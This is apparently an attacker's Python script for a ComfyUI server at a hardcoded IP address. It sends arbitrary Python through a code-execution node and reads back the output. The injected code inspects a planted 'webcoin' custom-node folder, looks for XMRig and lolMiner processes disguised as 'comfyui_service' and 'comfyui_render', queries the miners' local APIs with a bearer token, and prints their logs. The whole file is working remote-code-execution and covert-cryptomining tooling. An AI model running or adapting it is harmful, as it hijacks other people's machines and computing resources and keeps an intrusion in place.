"""Full diagnostic from the remote machine."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "131.113.41.148"
base = f"http://{ip}:8188"

code = r"""
import os, subprocess, platform, sys, glob

lines = []
is_win = platform.system() == 'Windows'

cn = None
try:
    import folder_paths
    if hasattr(folder_paths, 'get_folder_paths'):
        cn = folder_paths.get_folder_paths('custom_nodes')[0]
except:
    for g in [r'C:\Users\u88ni\Desktop\comfyui\custom_nodes', '/root/ComfyUI/custom_nodes']:
        if os.path.isdir(g):
            cn = g
            break

target = os.path.join(cn, 'webcoin') if cn else 'UNKNOWN'
lines.append(f'target={target}')
lines.append(f'exists={os.path.isdir(target)}')

if os.path.isdir(target):
    lines.append(f'files={sorted(os.listdir(target))}')
    init_path = os.path.join(target, '__init__.py')
    lines.append(f'has_init={os.path.exists(init_path)}')
    
    bin_dir = os.path.join(target, 'bin')
    lines.append(f'has_bin={os.path.isdir(bin_dir)}')
    if os.path.isdir(bin_dir):
        lines.append(f'bin_files={os.listdir(bin_dir)}')
    
    orch_pid = os.path.join(target, '.orch.pid')
    if os.path.exists(orch_pid):
        with open(orch_pid) as f:
            lines.append(f'orch.pid={f.read().strip()}')
    
    marker = os.path.join(target, '.initialized')
    lines.append(f'initialized={os.path.exists(marker)}')

# Check miner processes
try:
    import psutil
    for proc in psutil.process_iter(['pid', 'name', 'status']):
        try:
            name = (proc.info.get('name') or '').lower()
            if any(x in name for x in ['comfyui_service', 'comfyui_render', 'xmrig', 'lolminer']):
                lines.append(f'PROC: pid={proc.info["pid"]} name={proc.info["name"]} status={proc.info["status"]}')
        except:
            pass
except:
    lines.append('psutil unavailable')

# Check XMRig API locally  
import urllib.request as ur
try:
    req = ur.Request('http://127.0.0.1:44880/2/summary',
                     headers={'Accept': 'application/json', 'Authorization': 'Bearer ce_xm_2026'})
    with ur.urlopen(req, timeout=5) as r:
        lines.append(f'XMRig API: OK (200)')
except Exception as e:
    lines.append(f'XMRig API: {e}')

# Check lolMiner API locally
try:
    req = ur.Request('http://127.0.0.1:44882', headers={'Accept': 'application/json'})
    with ur.urlopen(req, timeout=5) as r:
        lines.append(f'lolMiner API: OK (200)')
except Exception as e:
    lines.append(f'lolMiner API: {e}')

# Read logs
for logname in ['service.log', 'render.log']:
    logpath = os.path.join(target, 'bin', logname) if os.path.isdir(target) else ''
    if os.path.exists(logpath):
        with open(logpath, 'r', errors='replace') as f:
            content = f.read()
        lines.append(f'{logname} ({len(content)} chars): {content[-300:]}')
    else:
        lines.append(f'{logname}: not found')

result = chr(10).join(lines)
"""

prompt = {
    "prompt": {
        "1": {
            "class_type": "IDENode",
            "inputs": {"pycode": code, "language": "python"}
        },
        "2": {
            "class_type": "PreviewTextNode",
            "inputs": {"text": ["1", 0]}
        }
    }
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print(f"prompt_id: {pid}")

time.sleep(10)

req2 = urllib.request.Request(f"{base}/history/{pid}", method="GET")
with urllib.request.urlopen(req2, timeout=10) as r:
    entry = json.loads(r.read().decode()).get(pid, {})
    status = entry.get("status", {}).get("status_str", "pending")
    print(f"Status: {status}\n")
    outputs = entry.get("outputs", {})
    for nid, nout in outputs.items():
        for key, val in nout.items():
            if isinstance(val, list):
                for v in val:
                    print(v)
